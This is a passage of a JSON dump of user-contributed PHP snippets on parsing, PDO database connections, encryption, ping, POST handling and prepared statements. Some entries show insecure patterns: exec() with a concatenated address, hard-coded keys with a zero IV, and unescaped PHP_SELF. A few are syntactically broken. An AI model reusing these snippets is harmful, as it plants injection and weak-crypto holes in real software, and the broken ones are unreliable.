    "description": "$txt_file    = file_get_contents('path/to/file.txt'); $rows        = explode(\"\\n\", $txt_file); array_shift($rows);  foreach($rows as $row => $data) {     //get row data     $row_data = explode('^', $data);      $info[$row]['id']           = $row_data[0];     $info[$row]['name']         = $row_data[1];     $info[$row]['description']  = $row_data[2];     $info[$row]['images']       = $row_data[3];      //display data     echo 'Row ' . $row . ' ID: ' . $info[$row]['id'] . '<br />';     echo 'Row ' . $row . ' NAME: ' . $info[$row]['name'] . '<br />';     echo 'Row ' . $row . ' DESCRIPTION: ' . $info[$row]['description'] . '<br />';     echo 'Row ' . $row . ' IMAGES:<br />';      //display images     $row_images = explode(',', $info[$row]['images']);      foreach($row_images as $row_image)     {         echo ' - ' . $row_image . '<br />';     }      echo '<br />'; }\n",
    "reg_date": "2021-10-12T10:18:54.000Z"
  },
  {
    "id": 3956,
    "keyword": null,
    "link": null,
    "title": " php parse float 2 decimal places",
    "description": "return number_format((float)$number, 2, '.', ''); \n$num = 5; $num = number_format($num, 2);\n$foo = \"105\"; echo number_format((float)$foo, 2, '.', '');\n<?php $number=100000; echo number_format($number).'<br>'; echo number_format($number, 2).'<br>'; echo number_format($number, 3).'<br>'; echo number_format($number, 2, ',', '.'); ?>\n100,000 100,000.00 100,000.000 100.000,00 \n",
    "reg_date": "2021-10-12T10:18:54.000Z"
  },
  {
    "id": 3957,
    "keyword": null,
    "link": null,
    "title": " php parse html",
    "description": "$dom = new DOMDocument(); $dom->loadHTMLFile('path/to/htmlfile.html');    // or loadHTML($str) $dom->load('path/to/xmlfile.xml');              // or loadXML($str)  $table = $dom->getElementById('mytable-id');    // DOMElement $lines = $table->getElementsByTagName('tr');    // DOMNodeList $links = $dom->getElementsByTagName('a');  $xpath = new DOMXpath($dom); $tables = $xpath->query(\"//table[contains(@class,'mytables-class')]\");\n",
    "reg_date": "2021-10-12T10:18:55.000Z"
  },
  {
    "id": 3958,
    "keyword": null,
    "link": null,
    "title": " php parse json",
    "description": "//Json Encode  $person = array(      \"name\" => \"KINGASV\",      \"title\" => \"CTO\" );  $personJSON=json_encode($person);//returns JSON string  //Json Decode  $personJSON = '{\"name\":\"KINGASV\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // KINGASV \n$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\n$json = json_decode(file_get_contents('/path/to/your/file.json'));\nvar jsonPerson = '{\"first_name\":\"billy\", \"age\":23}';  var personObject = JSON.parse(jsonPerson); //parse json string into JS object\nconst json = '{ \"fruit\": \"pineapple\", \"fingers\": 10 }'; const obj = JSON.parse(json); console.log(obj.fruit, obj.fingers);\njson_encode used when PHP retrieve data and convert Array() to [] !!!! $arr = array('a' => 1, 'b' => 2, 'c' => 3, 'd' => 4, 'e' => 5); echo json_encode($arr); //output {\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5} access from js file data.a, data.b,data.c... ----------------------------------------------   $json = '{\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5}'; json_decode($json, true); //true turns object to associative array;  //output array(5) {     [\"a\"] => int(1)     [\"b\"] => int(2)     [\"c\"] => int(3)     [\"d\"] => int(4)     [\"e\"] => int(5) }  \n",
    "reg_date": "2021-10-12T10:18:55.000Z"
  },
  {
    "id": 3959,
    "keyword": null,
    "link": null,
    "title": " php parse str",
    "description": "<?php $str = \"first=value&arr[]=foo+bar&arr[]=baz\";  // Recommended parse_str($str, $output); echo $output['first'];  // value echo $output['arr'][0]; // foo bar echo $output['arr'][1]; // baz  // DISCOURAGED parse_str($str); echo $first;  // value echo $arr[0]; // foo bar echo $arr[1]; // baz ?>\n",
    "reg_date": "2021-10-12T10:18:55.000Z"
  },
  {
    "id": 3960,
    "keyword": null,
    "link": null,
    "title": " php parse xml",
    "description": "$movies = new SimpleXMLElement($xmlstr);  echo $movies->movie[0]->plot;\n",
    "reg_date": "2021-10-12T10:18:55.000Z"
  },
  {
    "id": 3961,
    "keyword": null,
    "link": null,
    "title": " php pass a variabele to js",
    "description": "<script> 'var name = <?php echo json_encode($name); ?>; </script>'\n//passing PHP variable to JavaScript  var myJSVar = <?php echo json_encode($myPHPVar); ?>;\n",
    "reg_date": "2021-10-12T10:18:55.000Z"
  },
  {
    "id": 3962,
    "keyword": null,
    "link": null,
    "title": " php pass by reference",
    "description": "<?php function appendToString(&$string) {     $string .= 'Cool Im appended'; }  $str = 'I am a start and - '; appendToString($str); echo $str;    // outputs 'I am a start and - Cool Im appended' ?>\nfunction add(a, b, output) {   output.out = a + b; }  var output = {}; add(5, 3, output); console.log(output); //output: {out: 8}\n",
    "reg_date": "2021-10-12T10:18:55.000Z"
  },
  {
    "id": 3963,
    "keyword": null,
    "link": null,
    "title": " php pass variable to anonymous function",
    "description": " <?php $message = 'hello';  // No \"use\" $example = function () {     var_dump($message); }; $example();  // Inherit $message $example = function () use ($message) {     var_dump($message); }; $example();  // Inherited variable's value is from when the function // is defined, not when called $message = 'world'; $example();  // Reset message $message = 'hello';  // Inherit by-reference $example = function () use (&$message) {     var_dump($message); }; $example();  // The changed value in the parent scope // is reflected inside the function call $message = 'world'; $example();  // Closures can also accept regular arguments $example = function ($arg) use ($message) {     var_dump($arg . ' ' . $message); }; $example(\"hello\"); ?>  \n",
    "reg_date": "2021-10-12T10:18:55.000Z"
  },
  {
    "id": 3964,
    "keyword": null,
    "link": null,
    "title": " php password encryption and decryption",
    "description": "function encrypt_decrypt($string, $action = 'encrypt') {     $encrypt_method = \"AES-256-CBC\";     $secret_key = 'AA74CDCC2BBRT935136HH7B63C27'; // user define private key     $secret_iv = '5fgf5HJ5g27'; // user define secret key     $key = hash('sha256', $secret_key);     $iv = substr(hash('sha256', $secret_iv), 0, 16); // sha256 is hash_hmac_algo     if ($action == 'encrypt') {         $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);         $output = base64_encode($output);     } else if ($action == 'decrypt') {         $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);     }     return $output; }   echo \"Your Encrypted password is = \". $pwd = encrypt_decrypt('spaceo', 'encrypt'); echo \"Your Decrypted password is = \". encrypt_decrypt($pwd, 'decrypt'); \n$decoded = base64_decode($encoded); \nfunction encryptPass($password) {     $sSalt = '20adeb83e85f03cfc84d0fb7e5f4d290';     $sSalt = substr(hash('sha256', $sSalt, true), 0, 32);     $method = 'aes-256-cbc';      $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);      $encrypted = base64_encode(openssl_encrypt($password, $method, $sSalt, OPENSSL_RAW_DATA, $iv));     return $encrypted; }  function decryptPass($password) {     $sSalt = '20adeb83e85f03cfc84d0fb7e5f4d290';     $sSalt = substr(hash('sha256', $sSalt, true), 0, 32);     $method = 'aes-256-cbc';      $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);      $decrypted = openssl_decrypt(base64_decode($password), $method, $sSalt, OPENSSL_RAW_DATA, $iv);     return $decrypted; }\n",
    "reg_date": "2021-10-12T10:18:55.000Z"
  },
  {
    "id": 3965,
    "keyword": null,
    "link": null,
    "title": " php password verify",
    "description": "<?php /* Currently the default password hashing method is using BCRYPT This may change in the future if vulnerabilities are found in BCRYPT  Other options such as PASSWORD_BCRYPT and PASSWORD_ARGON2ID may be used instead of PASSWORD_DEFAULT */ $passwordHash = password_hash('password123', PASSWORD_DEFAULT); $passwordCandidate = 'password123'; // Password is correct here  /*  Check the password using password_verify password_verify() returns bool(true) if the password is correct If the password is not correct, it returns bool(false) */ if (password_Verify($passwordCandidate, $passwordHash)) { \techo 'Valid password!'; } else { \techo 'Invalid password!'; }\n <?php // See the password_hash() example to see where this came from. $hash = '$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq';  if (password_verify('rasmuslerdorf', $hash)) {     echo 'Password is valid!'; } else {     echo 'Invalid password.'; } ?>  \n <?php $hash = password_hash('rasmuslerdorf'); // the password_hash function will encrypt the password into a 60 character string if (password_verify('rasmuslerdorf', $hash)) {     echo 'Password is valid!'; } else {     echo 'Invalid password.'; } ?> // the only to decrypt is by using the password_verify() function \n$password = ;LULPassword342'; $hashedPassword = 'dasasdfjkl;asdfiojadfasdasdfasdfsda23412342345@#!$df';//hash $passwordCheck = password_verify($password,$hashedPassword);\n",
    "reg_date": "2021-10-12T10:18:55.000Z"
  },
  {
    "id": 3966,
    "keyword": null,
    "link": null,
    "title": " php pdo",
    "description": "$host     = \"localhost\";//Ip of database, in this case my host machine     $user     = \"root\";\t//Username to use $pass     = \"qwerty\";//Password for that user $dbname   = \"DB\";//Name of the database  try {     $connection = new PDO(\"mysql:host=$host;dbname=$dbname\", $user, $pass);     $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  }catch(PDOException $e) {   echo $e->getMessage();                          }\n<?php goto a; echo 'Foo';   a: echo 'Bar'; ?>\n<?php     \t$pdo = new PDO('mysql:host=localhost;   \t\t\t\tdbname=the_name_of_your_databe,   \t\t\t\t'username',                  'password''); # by default your username is root  # if you don't have a password don't fill in it  #(optional) :  \t$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); \t$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);  ?>\nconst DB_HOST = 'localhost'; const DB_NAME = 'DB_Name';\t\t\t//Name of the database const DB_USERNAME = 'username';\t\t//Username to use const DB_PASSWORD = 'Password';\t\t//Password for that user   // Data Source Name $dsn = \"mysql:host=\" . DB_HOST . \";dbname=\" . DB_NAME;  $options = [     PDO::ATTR_EMULATE_PREPARES   => false, // turn off emulation mode for \"real\" prepared statements     PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION, //turn on errors in the form of exceptions     PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_OBJ, //make the default fetch be an anonymous object with column names as properties ];  //Create PDO instance try {     $pdo = new PDO($dsn, DB_USERNAME, DB_PASSWORD, $options); } catch (PDOException $e) {     echo 'Connection failed: ' . $e->getMessage(); }\n$host = '127.0.0.1'; $db   = 'test'; $user = 'root'; $pass = ''; $charset = 'utf8mb4'; $dsn = \"mysql:host=$host;dbname=$db;charset=$charset\"; $options = [   \t\t\tPDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,             PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,             PDO::ATTR_EMULATE_PREPARES   => false,]; try { \t$pdo = new PDO($dsn, $user, $pass, $options); } catch (\\PDOException $e) {     throw new \\PDOException($e->getMessage(), (int)$e->getCode()); }\n$db = new PDO(\"sqlsrv:Server=YouAddress;Database=YourDatabase\", \"Username\", \"Password\"); \n",
    "reg_date": "2021-10-12T10:18:55.000Z"
  },
  {
    "id": 3967,
    "keyword": null,
    "link": null,
    "title": " php pdo connection",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n$host     = \"localhost\";//Ip of database, in this case my host machine     $user     = \"root\";\t//Username to use $pass     = \"qwerty\";//Password for that user $dbname   = \"DB\";//Name of the database  try {     $connection = new PDO(\"mysql:host=$host;dbname=$dbname\", $user, $pass);     $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  }catch(PDOException $e) {   echo $e->getMessage();                          }\n<?php class database{   private $host = \"localhost\";   private $db_name = \"php_basic\";   private $username = \"root\";   private $password = \"\";   private $conn;    // connect database using PDO   function connect_pdo(){     try{       $this->conn = new PDO(\"mysql:host=\".$this->host.\";dbname=\".$this->db_name, $this->username, $this->password);       return $this->conn;     }     catch(PDOException $ex){       echo \"Connection Error -->> \",$ex->getMessage();       echo \"<br>Error Code -->> \",$ex->getCode();       echo \"<br>Error occur in File -->> \",$ex->getFile();       echo \"<br>Error occur on Line no -->> \",$ex->getLine();        $this->conn = null; // close connection in PDO     }   } } ?>    //how to use  <?php include 'connect_db.php'; $database=new database(); $db = $database->connect_pdo(); ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {   $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);   // set the PDO error mode to exception   $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);   echo \"Connected successfully\"; } catch(PDOException $e) {   echo \"Connection failed: \" . $e->getMessage(); } ?>\n<?php $db = new PDO('mysql:host=myhost;dbname=mydb', 'login', 'password');   \n<?php     \t$pdo = new PDO('mysql:host=localhost;   \t\t\t\tdbname=the_name_of_your_databe,   \t\t\t\t'username',                  'password''); # by default your username is root  # if you don't have a password don't fill in it  #(optional) :  \t$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); \t$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);  ?>\n",
    "reg_date": "2021-10-12T10:18:56.000Z"
  },
  {
    "id": 3968,
    "keyword": null,
    "link": null,
    "title": " php pdo delete query",
    "description": "  $count=$dbo->prepare(\"DELETE FROM pdo_admin WHERE id=:id\"); $count->bindParam(\":id\",$id,PDO::PARAM_INT); $count->execute(); \nTo delete data from a table, you use the MySQL DELETE statement. The following illustrates the syntax of the DELETE statement:  DELETE FROM table_name WHERE condition; In this statement:  First, specify the table from which you delete data. Second, use a condition to specify which rows to delete in the WHERE clause. The DELETE statement will delete rows that match the condition,\n",
    "reg_date": "2021-10-12T10:18:56.000Z"
  },
  {
    "id": 3969,
    "keyword": null,
    "link": null,
    "title": " php pdo error handling",
    "description": "$database -> errorInfo()[0] # SQLSTATE error code (a five characters alphanumeric identifier defined in the ANSI SQL standard). $database -> errorInfo()[1] # Driver-specific error code. $database -> errorInfo()[2] # Driver-specific error message.\n",
    "reg_date": "2021-10-12T10:18:56.000Z"
  },
  {
    "id": 3970,
    "keyword": null,
    "link": null,
    "title": " php pdo example",
    "description": "$host     = \"localhost\";//Ip of database, in this case my host machine     $user     = \"root\";\t//Username to use $pass     = \"qwerty\";//Password for that user $dbname   = \"DB\";//Name of the database  try {     $connection = new PDO(\"mysql:host=$host;dbname=$dbname\", $user, $pass);     $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  }catch(PDOException $e) {   echo $e->getMessage();                          }\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {   $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);   // set the PDO error mode to exception   $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);   echo \"Connected successfully\"; } catch(PDOException $e) {   echo \"Connection failed: \" . $e->getMessage(); } ?>\nconst DB_HOST = 'localhost'; const DB_NAME = 'DB_Name';\t\t\t//Name of the database const DB_USERNAME = 'username';\t\t//Username to use const DB_PASSWORD = 'Password';\t\t//Password for that user   // Data Source Name $dsn = \"mysql:host=\" . DB_HOST . \";dbname=\" . DB_NAME;  $options = [     PDO::ATTR_EMULATE_PREPARES   => false, // turn off emulation mode for \"real\" prepared statements     PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION, //turn on errors in the form of exceptions     PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_OBJ, //make the default fetch be an anonymous object with column names as properties ];  //Create PDO instance try {     $pdo = new PDO($dsn, DB_USERNAME, DB_PASSWORD, $options); } catch (PDOException $e) {     echo 'Connection failed: ' . $e->getMessage(); }\n$host = '127.0.0.1'; $db   = 'test'; $user = 'root'; $pass = ''; $charset = 'utf8mb4'; $dsn = \"mysql:host=$host;dbname=$db;charset=$charset\"; $options = [   \t\t\tPDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,             PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,             PDO::ATTR_EMULATE_PREPARES   => false,]; try { \t$pdo = new PDO($dsn, $user, $pass, $options); } catch (\\PDOException $e) {     throw new \\PDOException($e->getMessage(), (int)$e->getCode()); }\n<?php  $dsn = \"mysql:host=localhost;dbname=mydb\"; $user = \"user12\"; $passwd = \"12user\";  $pdo = new PDO($dsn, $user, $passwd);  \n$array_of_values = array( \"Brasil\", \"Argentina\" ); $types = \"ss\"; $mysqli_stmt->bind_param( $types, ...$array_of_values ); \n",
    "reg_date": "2021-10-12T10:18:56.000Z"
  },
  {
    "id": 3971,
    "keyword": null,
    "link": null,
    "title": " php pdo get database name",
    "description": "$pdo->query('select database()')->fetchColumn();\n",
    "reg_date": "2021-10-12T10:18:56.000Z"
  },
  {
    "id": 3972,
    "keyword": null,
    "link": null,
    "title": " php pdo has result",
    "description": "<?php /* Delete all rows from the FRUIT table */ $del = $dbh->prepare('DELETE FROM fruit'); $del->execute();  /* Return number of rows that were deleted */ print(\"Return number of rows that were deleted:\\n\"); $count = $del->rowCount(); print(\"Deleted $count rows.\\n\"); ?>\n",
    "reg_date": "2021-10-12T10:18:56.000Z"
  },
  {
    "id": 3973,
    "keyword": null,
    "link": null,
    "title": " php pdo last insert id",
    "description": "$stmt = $db->prepare(\"...\"); $stmt->execute(); $id = $db->lastInsertId();\n Beware of lastInsertId() when working with transactions in mysql. The following code returns 0 instead of the insert id.    <?php  try {      $dbh = new PDO('mysql:host=localhost;dbname=test', 'username', 'password');        $stmt = $dbh->prepare(\"INSERT INTO test (name, email) VALUES(?,?)\");        try {          $dbh->beginTransaction();          $tmt->execute( array('user', 'user@example.com'));          $dbh->commit();          print $dbh->lastInsertId();      } catch(PDOExecption $e) {          $dbh->rollback();          print \"Error!: \" . $e->getMessage() . \"</br>\";      }  } catch( PDOExecption $e ) {      print \"Error!: \" . $e->getMessage() . \"</br>\";  }  ?>    When no exception is thrown, lastInsertId returns 0. However, if lastInsertId is called before calling commit, the right id is returned. \n$(document).ready(function(){ $.ajax({ url: \"database/update.html\",         context: document.body,         success: function(){            alert(\"done\");         }}); }); \n",
    "reg_date": "2021-10-12T10:18:56.000Z"
  },
  {
    "id": 3974,
    "keyword": null,
    "link": null,
    "title": " php pdo set charset",
    "description": "$con=\"\"; $MODE=\"\"; $dbhost = \"localhost\"; $dbuser = \"root\"; $dbpassword = \"\"; $database = \"name\";  $con = new PDO ( \"mysql:host=$dbhost;dbname=$database\", \"$dbuser\", \"$dbpassword\", array(PDO::MYSQL_ATTR_INIT_COMMAND => \"SET NAMES utf8\")); $con->setAttribute ( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );    \n",
    "reg_date": "2021-10-12T10:18:56.000Z"
  },
  {
    "id": 3975,
    "keyword": null,
    "link": null,
    "title": " php pdo sql server connect",
    "description": "$db = new PDO(\"sqlsrv:Server=YouAddress;Database=YourDatabase\", \"Username\", \"Password\"); \n",
    "reg_date": "2021-10-12T10:18:56.000Z"
  },
  {
    "id": 3976,
    "keyword": null,
    "link": null,
    "title": " php pi() function",
    "description": " <?php echo pi(); // 3.1415926535898 echo M_PI; // 3.1415926535898 ?>  \n Pi is often usefull in con/sin/tan functions..  There are also other Pi related constants.  These are most of them:    M_PI  = 3.14159265358979323846 // pi    // The following were added in PHP 4.0.0  M_PI_2 = 1.57079632679489661923 // pi/2   M_PI_4 = 0.78539816339744830962 // pi/4   M_1_PI = 0.31830988618379067154 // 1/pi   M_2_PI = 0.63661977236758134308 // 2/pi   M_SQRTPI = 1.77245385090551602729 // sqrt(pi) (Only in PHP 4.0.2+)  M_2_SQRTPI = 1.12837916709551257390 // 2/sqrt(pi) \npi()  M_PI\n",
    "reg_date": "2021-10-12T10:18:56.000Z"
  },
  {
    "id": 3977,
    "keyword": null,
    "link": null,
    "title": " php pi",
    "description": "pi()  M_PI\necho(pi()); // returns 3.1415926535898\n",
    "reg_date": "2021-10-12T10:18:57.000Z"
  },
  {
    "id": 3978,
    "keyword": null,
    "link": null,
    "title": " php pi value",
    "description": " <?php echo pi(); // 3.1415926535898 echo M_PI; // 3.1415926535898 ?>  \n",
    "reg_date": "2021-10-12T10:18:57.000Z"
  },
  {
    "id": 3979,
    "keyword": null,
    "link": null,
    "title": " php ping",
    "description": "<?php $ip_address = '123.456.789.0'; // IP address you'd like to ping. exec(\"ping -c 1 \" . $ip_address . \" | head -n 2 | tail -n 1 | awk '{print $7}'\", $ping_time); print $ping_time[0]; // First item in array, since exec returns an array. ?>\nexec(\"ping \".$ip, $output, $status); // $ip: desired ip address // $output: result messages from the ping // $status: result status code from the ping //\t\t0: success //\t\t1: no response //\t\t2: other errors\n",
    "reg_date": "2021-10-12T10:18:57.000Z"
  },
  {
    "id": 3980,
    "keyword": null,
    "link": null,
    "title": " php ping time",
    "description": "<?php $ip_address = '123.456.789.0'; // IP address you'd like to ping. exec(\"ping -c 1 \" . $ip_address . \" | head -n 2 | tail -n 1 | awk '{print $7}'\", $ping_time); print $ping_time[0]; // First item in array, since exec returns an array. ?>\nexec(\"ping \".$ip, $output, $status); // $ip: desired ip address // $output: result messages from the ping // $status: result status code from the ping //\t\t0: success //\t\t1: no response //\t\t2: other errors\n",
    "reg_date": "2021-10-12T10:18:57.000Z"
  },
  {
    "id": 3981,
    "keyword": null,
    "link": null,
    "title": " php pop off the first character of string",
    "description": "<?php echo substr('abcdef', 1);     // bcdef ?>\n$str = \"The quick brown fox jumps over the lazy dog.\" $str2 = substr($str, 4); // \"quick brown fox jumps over the lazy dog.\" \n$str = substr($str, 1);\n",
    "reg_date": "2021-10-12T10:18:57.000Z"
  },
  {
    "id": 3982,
    "keyword": null,
    "link": null,
    "title": " php post",
    "description": "<?php print_r($_POST); ?>\n<form method=\"post\" action=\"<?php echo $_SERVER['PHP_SELF'];?>\">   Name: <input type=\"text\" name=\"fname\">   <input type=\"submit\"> </form> <?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {   // do logic   $name = $_POST['fname']; } ?>\n$response = httpPost(\"http://mywebsite.com/update.php\", \tarray(\"first_name\"=>\"Bob\",\"last_name\"=>\"Dillon\") );  //using php curl (sudo apt-get install php-curl)  function httpPost($url, $data){     $curl = curl_init($url);     curl_setopt($curl, CURLOPT_POST, true);     curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     $response = curl_exec($curl);     curl_close($curl);     return $response; }\nif( isset($_POST['fromPerson']) ) {      $fromPerson = '+from:'.$_POST['fromPerson'];      echo $fromPerson; }  //Note: This resolves as true even if all $_POST values are empty strings if (!empty($_POST)) {     // handle post data     $fromPerson = '+from:'.$_POST['fromPerson'];     echo $fromPerson; }\n$url = 'http://server.com/path'; $data = array('key1' => 'value1', 'key2' => 'value2');  // use key 'http' even if you send the request to https://... $options = array(     'http' => array(         'header'  => \"Content-type: application/x-www-form-urlencoded\\r\\n\",         'method'  => 'POST',         'content' => http_build_query($data)     ) ); $context  = stream_context_create($options); $result = file_get_contents($url, false, $context); if ($result === FALSE) { /* Handle error */ }  var_dump($result); \n",
    "reg_date": "2021-10-12T10:18:57.000Z"
  },
  {
    "id": 3983,
    "keyword": null,
    "link": null,
    "title": " php post form to self",
    "description": "<form action=\"<?php echo $_SERVER['PHP_SELF']; ?>\">  //there is no reason to use this to submit form data to the same page <form action=\"\">  //will do the same thing\n// Here is how to post form data to self or to the same page &  // avoid the PHP_SELF exploits at the same time. <form name=\"my_form\" method=\"post\"   action=\"<?php echo htmlentities($_SERVER['PHP_SELF']); ?>\">  </form>\n<form name=\"form1\" method=\"post\" action=\"<?php echo $_SERVER['PHP_SELF']; ?>\" >  \naction=\"<?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]); ?>\"\n",
    "reg_date": "2021-10-12T10:18:57.000Z"
  },
  {
    "id": 3984,
    "keyword": null,
    "link": null,
    "title": " php post self",
    "description": "  <form action=\"<?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]); ?>\" method=\"post\">         Name: <input type=\"text\" name=\"name\"><br>         Email: <input type=\"text\" name=\"email\"><br>         <input type=\"submit\">     </form>\n",
    "reg_date": "2021-10-12T10:18:57.000Z"
  },
  {
    "id": 3985,
    "keyword": null,
    "link": null,
    "title": " php postgresql number of rows",
    "description": " pg_num_rows(resource $result);\n",
    "reg_date": "2021-10-12T10:18:57.000Z"
  },
  {
    "id": 3986,
    "keyword": null,
    "link": null,
    "title": " php pow",
    "description": "$z = pow(2, 8); \t// int(256) $z = $x ** $y;\t\t// PHP >= 5.6\n<?php var_dump(pow(2, 8)); // int(256) ?>\n",
    "reg_date": "2021-10-12T10:18:58.000Z"
  },
  {
    "id": 3987,
    "keyword": null,
    "link": null,
    "title": " php predefined constants",
    "description": "<?php     // EXAMPLE (a superglobal is a variable that is predefined within the environment) echo \"This is line \" . __LINE__ . \" of the [\" . __FILE__ . \"] file\"; // OUTPUT: This is line 31 of the [C:/MadeUpFolder/MadeUpFile.php] file   // Superglobals /******************+*************************************************** | <<< VARIABLE >>> |<<< DESCRIPTION >>> +******************+*************************************************** |   __FILE__       | The current line number of the file. +------------------+--------------------------------------------------- |   __LINE__       | The full path and filename of the file +------------------+--------------------------------------------------- |   __DIR__        | The directory of the file +------------------+--------------------------------------------------- |   __FUNCTION__   | The function name +------------------+--------------------------------------------------- |   __CLASS__      | The class name +------------------+--------------------------------------------------- |   __METHOD__     | The class method name +------------------+--------------------------------------------------- |   __NAMESPACE__  | The name of the current namespace (case-sensitive) +------------------+--------------------------------------------------- */  ?>\n",
    "reg_date": "2021-10-12T10:18:58.000Z"
  },
  {
    "id": 3988,
    "keyword": null,
    "link": null,
    "title": " php preg match email validation code",
    "description": "<?php    function checkemail($str) {          return (!preg_match(\"/^([a-z0-9\\+_\\-]+)(\\.[a-z0-9\\+_\\-]+)*@([a-z0-9\\-]+\\.)+[a-z]{2,6}$/ix\", $str)) ? FALSE : TRUE;    }    if(!checkemail(\"alex@tutorialspoint.com\")){       echo \"Invalid email address.\";    }    else{       echo \"Valid email address.\";    } ?>\n",
    "reg_date": "2021-10-12T10:18:58.000Z"
  },
  {
    "id": 3989,
    "keyword": null,
    "link": null,
    "title": " php preg match space or start of string",
    "description": "/\\b(stackoverflow)\\b/\n",
    "reg_date": "2021-10-12T10:18:58.000Z"
  },
  {
    "id": 3990,
    "keyword": null,
    "link": null,
    "title": " php preg match special characters",
    "description": "  $string=\"sadw$\"   if(preg_match(\"/[\\[^\\'&pound;$%^&*()}{@:\\'#~?><>,;@\\|\\\\\\-=\\-_+\\-&not;\\`\\]]/\", $string)){    //this string contain atleast one of these [^'&pound;$%^&*()}{@:'#~?><>,;@|\\-=-_+-&not;`] characters   } \n  $string=\"sadw$\"   if(preg_match(\"/[\\[^\\'&pound;$%^&*()}{@:\\'#~?><>,;@\\|\\\\\\-=\\-_+\\-&not;\\`\\]]/\", $string)){    //this string contain atleast one of these [^'&pound;$%^&*()}{@:'#~?><>,;@|\\-=-_+-&not;`] characters   }\n",
    "reg_date": "2021-10-12T10:18:58.000Z"
  },
  {
    "id": 3991,
    "keyword": null,
    "link": null,
    "title": " php preg replace whitespace",
    "description": "$id = \"aa aa\"; echo $id; preg_replace('/\\s+/', '_', $id); echo $id; \n",
    "reg_date": "2021-10-12T10:18:58.000Z"
  },
  {
    "id": 3992,
    "keyword": null,
    "link": null,
    "title": " php prepared statement select",
    "description": "// Multiple rows: $sql = \"SELECT * FROM users WHERE id=?\"; $stmt = $conn->prepare($sql);  $stmt->bind_param(\"i\", $id); $stmt->execute(); $result = $stmt->get_result(); while ($row = $result->fetch_assoc()) {     echo $row['name']; }  //Single row: $sql = \"SELECT user FROM users WHERE id=?\"; // SQL with parameters $stmt = $conn->prepare($sql);  $stmt->bind_param(\"i\", $id); $stmt->execute(); $result = $stmt->get_result(); // get the mysqli result $user = $result->fetch_assoc(); // fetch data    // Update/delete from $sql = \"UPDATE users SET rank=?, status=? WHERE id=?\"; // SQL with parameters $sql = \"DELETE FROM users WHERE id=?\"; $stmt = $conn->prepare($sql);  $stmt->bind_param('sss', $rank, $status, $id); $stmt->execute();\n//on sql server public function get_data_from($id){   $request = \"SELECT * FROM tableName WHERE id = ?\";    //preparing the request   $stmt = $this->dbh->prepare($request);    //executing the request   $stmt->execute( array($id)  );    //fetching the result of the request   $result = $stmt->fetchAll();    return $result; }\n$stmt = $mysqli->prepare(\"SELECT * FROM myTable WHERE name = ? AND age = ?\"); $stmt->bind_param(\"si\", $_POST['name'], $_POST['age']); $stmt->execute(); $stmt->close();\n$stmt = $mysqli->prepare(\"UPDATE myTable SET name = ? WHERE id = ?\"); $stmt->bind_param(\"si\", $_POST['name'], $_SESSION['id']); $stmt->execute(); $stmt->close(); Copy\n$stmt->bind_param(\"i\", $data); // Type: Integer $stmt->bind_param(\"d\", $data); // Type: Double $stmt->bind_param(\"s\", $data); // Type: String $stmt->bind_param(\"b\", $data); // Type: Blob\n",
    "reg_date": "2021-10-12T10:18:58.000Z"
  },
  {
    "id": 3993,
    "keyword": null,
    "link": null,
    "title": " php pretty print",
